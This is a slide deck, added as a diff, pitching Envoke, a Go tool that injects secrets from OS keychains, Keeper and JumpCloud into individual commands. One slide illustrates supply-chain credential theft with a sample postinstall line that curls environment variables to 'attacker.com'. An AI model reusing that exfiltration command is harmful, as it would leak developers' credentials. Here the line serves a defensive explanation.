@@ -1,0 +1,163 @@
+Envoke
+Secrets management for your whole team
+Tags: tools, developer-experience, secrets
+
+Gerco Dries
+
+* The Problem
+
+Secrets management for local dev is a mess.
+
+- `.env` files get committed accidentally
+- `.env.example` files go stale immediately
+- Every dev has a different setup
+- Our secrets live in Keeper and JumpCloud — envchain doesn't know they exist
+
+Nobody has the same environment. Onboarding is an archaeology project.
+
+* What envchain does
+
+envchain is the right idea, executed narrowly.
+
+	$ envchain myapp-db psql -h $DB_HOST -U $DB_USER
+
+- Stores secrets in the OS keychain
+- Injects them as environment variables
+- Spawns your command as a subprocess
+
+Clean. Simple. But limited to one namespace, one backend, and no Windows.
+
+* Envoke: envchain, but better
+
+Same mental model. Bigger surface.
+
+- ✅ Windows (Credential Manager), macOS (Keychain), Linux (Secret Service)
+- ✅ Keeper Secrets Manager
+- ✅ JumpCloud Password Manager
+- ✅ Compose multiple namespaces in one run
+- ✅ Project-local dotfile — committed to git
+- ✅ Secret access protected by whatever your backend enforces — Touch ID, Face ID, MFA, hardware tokens
+
+	$ ee -- make dev
+
+No namespace argument. No flags. The project knows what it needs.
+
+* The Dotfile
+
+`.envoke` lives in your project root and gets committed.
+
+	[[namespace]]
+	name = "aws-dev"
+	backend = "keeper"
+
+	[[namespace]]
+	name = "db-local"
+	backend = "keychain"
+
+	[[namespace]]
+	name = "stripe-test"
+	backend = "jumpcloud"
+
+No secrets. Just the shape of your environment. Safe to commit, useful to review.
+
+* Global + Local Composition
+
+	~/.config/envoke/config.toml    ← your backends, your credentials
+	<project>/.envoke               ← what this project needs  (committed)
+	<project>/.envoke.local         ← your personal overrides  (gitignored)
+
+The global config is *how* to reach your backends.
+The dotfile is *what* this project needs.
+
+A Windows dev and a Mac dev share the same `.envoke`.
+Their global configs differ. Their experience doesn't.
+
+* This Is a Team Primitive
+
+envchain is a personal productivity tool.
+Envoke is a team contract.
+
+- New dev clones repo, runs `ee -- make dev` — it works
+- No "ask Bob which env vars you need"
+- No stale `.env.example` to maintain
+- Secret surface is visible and reviewable in PRs
+
+The committed dotfile turns secret management from an individual habit
+into shared team infrastructure.
+
+* The Credential Theft Problem Is Getting Worse
+
+Supply chain attacks are increasingly targeting developer credentials.
+
+Recent pattern: malicious packages (npm, PyPI, etc.) that exfiltrate environment variables on install.
+
+	$ npm install some-package
+	# somewhere in postinstall: curl attacker.com -d "$(env)"
+
+If your secrets live in your shell environment — `.env` sourced in `.bashrc`, `direnv` auto-loading — they're exposed to *every process you run*, including every package you install.
+
+Envoke inverts this: secrets are injected *per command*, not loaded globally.
+A compromised dependency only sees what the process it runs in sees. Nothing more.
+
+* The Agent Angle
+
+AI coding agents don't need access to your secret store.
+
+	$ ee -- aider --model claude-sonnet-4-6
+
+Secrets are injected before the agent process starts.
+The agent reads `$DB_HOST` from its environment — just like any other program.
+It never touches Keeper. Never authenticates to JumpCloud.
+No credentials in context. No credential theft surface.
+
+The blast radius for a compromised agent is the process lifetime, not your vault.
+
+* More Than a Runner
+
+`ee` ships with a full TUI for managing your secret environment.
+
+- `ee init` — interactive setup wizard, writes `.envoke` for you
+- `ee status` — dashboard: which backends are reachable, which need re-auth
+- `ee run` — fuzzy profile picker when you have multiple environments
+- `ee edit` — browse and edit secrets without values leaking into shell history
+
+Built with Bubble Tea. Degrades gracefully in CI and piped output.
+
+* Pluggable Backend Architecture
+
+	type Backend interface {
+	    Get(namespace, key string) (string, error)
+	    Set(namespace, key, value string) error
+	    List(namespace string) ([]string, error)
+	}
+
+- `OsKeychainBackend` — day one, all platforms
+- `KeeperBackend` — Keeper Secrets Manager SDK
+- `JumpCloudBackend` — JumpCloud REST API
+- `SopsBackend`, `VaultBackend` — future
+
+Add a backend without touching core logic.
+New backends are just new interface implementations.
+
+* Why Go
+
+- Single binary, no runtime, no installer
+- Cross-compile to Windows/macOS/Linux in one command
+- `99designs/keyring` covers all OS keychains out of the box
+- Keeper and JumpCloud have Go SDKs
+- `BurntSushi/toml` for the dotfile — solid, zero drama
+
+The language gets out of the way. We ship something real in a day.
+
+* Summary
+
+envchain → envoke
+
+- macOS + Linux only → *Windows + macOS + Linux*
+- OS keychain only → *Keeper, JumpCloud, OS keychain*
+- One namespace per run → *Compose namespaces*
+- Individual habit → *Team contract*
+- No project context → *Committed dotfile*
+- No TUI → *init, status, run, edit*
+
+Same idea. Works for the whole team.
